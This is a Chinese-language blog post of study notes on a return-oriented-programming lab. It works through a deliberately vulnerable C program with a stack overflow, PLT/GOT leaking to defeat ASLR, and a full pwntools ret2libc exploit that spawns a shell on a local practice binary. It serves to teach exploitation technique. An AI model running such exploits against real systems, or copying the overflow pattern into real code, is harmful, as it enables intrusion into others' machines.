---
title: 通过ROP绕过DEP和ASLR防护
date: 2018-03-17 19:22:31
tags: PWN

---

## 0x00 前言

看蒸米师傅的一步一步学ROP做的笔记

<!--more-->

## 0x01 程序源代码：

和之前一样

​    

```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function() {
char buf[128];
read(STDIN_FILENO, buf, 256);
}

int main(int argc, char** argv) {
vulnerable_function();
write(STDOUT_FILENO, "Hello, World\n", 13);
}
```

那么现在开启ASLR，

```
sudo -s 
echo 2 > /proc/sys/kernel/randomize_va_space
```

查看一下：

```
root@mask-virtual-machine:~/mzheng# cat /proc/sys/kernel/randomize_va_space
2
```

然后查看一下：
​    

```
root@mask-virtual-machine:~/mzheng# ldd ./level2
	linux-gate.so.1 =>  (0xb77e5000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7615000)
	/lib/ld-linux.so.2 (0x80020000)
root@mask-virtual-machine:~/mzheng# ldd ./level2
	linux-gate.so.1 =>  (0xb776a000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb759a000)
	/lib/ld-linux.so.2 (0x80047000)
root@mask-virtual-machine:~/mzheng# ldd ./level2
	linux-gate.so.1 =>  (0xb7714000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7544000)
	/lib/ld-linux.so.2 (0x8008c000)
root@mask-virtual-machine:~/mzheng# ldd ./level2
	linux-gate.so.1 =>  (0xb77e2000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7612000)
	/lib/ld-linux.so.2 (0x80020000)
root@mask-virtual-machine:~/mzheng# ldd ./level2
	linux-gate.so.1 =>  (0xb77b9000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75e9000)
	/lib/ld-linux.so.2 (0x8001a000)
root@mask-virtual-machine:~/mzheng# ldd ./level2
	linux-gate.so.1 =>  (0xb7796000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75c6000)
	/lib/ld-linux.so.2 (0x800c2000)
```

你会发现，libc.so的地址每次都不一样，一直在变化，那么怎么办呢？

> 思路是：我们需要先泄漏出libc.so某些函数在内存中的地址，然后再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，然后再执行我们的ret2libc的shellcode。

这里结合蒸米师傅给的那张图

{%asset_img 1.png%}

栈，libc，heap的地址都是随机的，但是程序本身在内存中的地址并不是随机的

所以我们只要把返回值设置到程序本身就可执行我们期望的指令了

首先查看可以利用的plt函数以及对应的got表，这里提到的几个概念可以参考这篇文章 [Linux中的GOT和PLT到底是个啥？](http://www.freebuf.com/articles/system/135685.html "Linux中的GOT和PLT到底是个啥？")

```
root@mask-virtual-machine:~/mzheng# objdump -d -j .plt level2

level2： 文件格式 elf32-i386

    

Disassembly of section .plt:

080482f0 <read@plt-0x10>:
 80482f0:	ff 35 04 a0 04 08	pushl  0x804a004
 80482f6:	ff 25 08 a0 04 08	jmp*0x804a008
 80482fc:	00 00	add%al,(%eax)
	...

08048300 <read@plt>:
 8048300:	ff 25 0c a0 04 08	jmp*0x804a00c
 8048306:	68 00 00 00 00   	push   $0x0
 804830b:	e9 e0 ff ff ff   	jmp80482f0 <_init+0x28>

08048310 <__libc_start_main@plt>:
 8048310:	ff 25 10 a0 04 08	jmp*0x804a010
 8048316:	68 08 00 00 00   	push   $0x8
 804831b:	e9 d0 ff ff ff   	jmp80482f0 <_init+0x28>

08048320 <write@plt>:
 8048320:	ff 25 14 a0 04 08	jmp*0x804a014
 8048326:	68 10 00 00 00   	push   $0x10
 804832b:	e9 c0 ff ff ff   	jmp80482f0 <_init+0x28>
root@mask-virtual-machine:~/mzheng#
```

 

这里蒸米师傅解释的很清楚，我就摘抄了下来：

> 我们发现除了程序本身的实现的函数之外，我们还可以使用read@plt()和write@plt()函数。但因为程序本身并没有调用system()函数，所以我们并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got 跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）
>
> 因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。

然后exp以及代码解释：
​    

```
#!/usr/bin/env python
from pwn import *

libc = ELF('libc.so') #这里调用了pwntools的ELF()函数，目的是为了后面算偏移地址
elf = ELF('level2')

p = process('./level2')
#p = remote('127.0.0.1', 10003)

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)
vulfun_addr =0x0804843b
print 'vulfun= ' + hex(vulfun_addr)

payload1 = 'a'*140 + p32(plt_write) + p32(vulfun_addr) + p32(1) +p32(got_write) + p32(4)

#payload1的作用相当于调用了一次write(1,gotwrite,4),打印出了got表处write函数位置的值，然后返回到vulfun函数

print "\n###sending payload1 ...###"
p.send(payload1)

print "\n###receving write() addr...###"
write_addr = u32(p.recv(4))
print 'write_addr=' + hex(write_addr)

print "\n###calculating system() addr and \"/bin/sh\" addr...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)

payload2 = 'a'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

#即调用system("/bin/sh")

print "\n###sending payload2 ...###"
p.send(payload2)

p.interactive()
```